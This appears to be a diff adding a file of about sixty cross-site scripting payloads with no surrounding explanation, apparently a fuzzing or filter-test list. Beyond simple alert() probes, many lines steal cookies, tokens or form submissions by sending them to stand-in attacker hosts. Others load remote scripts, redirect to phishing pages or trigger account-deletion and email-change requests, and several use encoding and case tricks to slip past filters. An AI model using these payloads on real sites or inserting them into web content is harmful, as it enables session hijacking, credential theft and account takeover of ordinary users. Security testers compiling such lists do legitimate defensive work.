@@ -1,0 +1,60 @@
+<script>alert(1)</script>
+<img src=x onerror=alert(document.cookie)>
+javascript:alert(1)
+"><svg/onload=fetch('//evil.example/'+document.cookie)>
+%3Cscript%3Ealert(1)%3C/script%3E
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+<a href="javascript:void(0)" onclick="steal()">click</a>
+';alert(String.fromCharCode(88,83,83))//
+<iframe srcdoc="<script>parent.alert(1)</script>">
+{{constructor.constructor('alert(1)')()}}
+<body onload=alert(1)>
+<details open ontoggle=alert(1)>
+<ScRiPt src=//evil.example/x.js></sCrIpT>
+https://shop.example.com/search?q=<script>document.location='http://evil.example/?c='+document.cookie</script>
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+<img src="photo.jpg" onload="new Image().src='https://attacker.example/c?'+document.cookie">
+<input autofocus onfocus=eval(atob('YWxlcnQoMSk='))>
+<a href="jav&#x09;ascript:alert(1)">profile</a>
+<div style="background:url(javascript:alert(1))">
+<svg><script>fetch('https://attacker.example/'+localStorage.token)</script></svg>
+<object data="javascript:alert(1)">
+<form action="javascript:alert(1)"><input type=submit>
+<p>Nice post!</p><script src="https://attacker.example/hook.js"></script>
+https://news.example.org/article?id=42&ref="><img src=x onerror=prompt(1)>
+<video><source onerror="location='https://attacker.example/?'+document.cookie">
+<marquee onstart=confirm(1)>
+"-alert(1)-"
+</script><script>alert(document.domain)</script>
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+<button onclick="document.forms[0].action='https://attacker.example/steal'">Save</button>
+<b onmouseover="window.location='https://attacker.example'">hover me</b>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<a href="#" onclick="fetch('/api/delete-account',{method:'POST'})">Free gift</a>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<x contenteditable onblur=alert(1)>lose focus!
+<script>new Image().src="https://attacker.example/log?c="+encodeURIComponent(document.cookie)</script>
+<IMG SRC=JaVaScRiPt:alert('hi')>
+<textarea onfocus=alert(1) autofocus>
+<img src=1 href=1 onerror="javascript:alert(1)"></img>
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">open</a>
+<img src=x onerror=this.src='https://collector.example/?c='+document.cookie>
+<select autofocus onfocus=location.assign('https://phish.example')>
+<div onpointerover="navigator.sendBeacon('https://collector.example', document.cookie)">hi</div>
+<script>document.querySelector('form').addEventListener('submit', e => fetch('https://collector.example', {method:'POST', body:new FormData(e.target)}))</script>
+https://blog.example.net/post?id=7&author=<svg onload=alert(1)>
+<iframe src="javascript:parent.document.body.innerHTML='hacked'"></iframe>
+<a href="JaVaScRiPt:fetch('https://collector.example/'+document.cookie)">My website</a>
+<img src="x" onerror="var s=document.createElement('script');s.src='https://cdn.attacker.example/a.js';document.head.appendChild(s)">
+<isindex type=image src=1 onerror=alert(1)>
+<body onhashchange="eval(location.hash.slice(1))">
+<style>@import 'javascript:alert(1)';</style>
+"><script>window.location='https://phish.example/login?next='+encodeURIComponent(location.href)</script>
+<p onmouseenter=$.post('/settings/email',{email:'a@attacker.example'})>Great article</p>
+%3Csvg%20onload%3Dfetch(%27%2F%2Fcollector.example%2F%27%2Bdocument.cookie)%3E
+<keygen autofocus onfocus=alert(1)>
+'onmouseover='alert(1)
+<img src=x:alert(alt) onerror=eval(src) alt=xss>
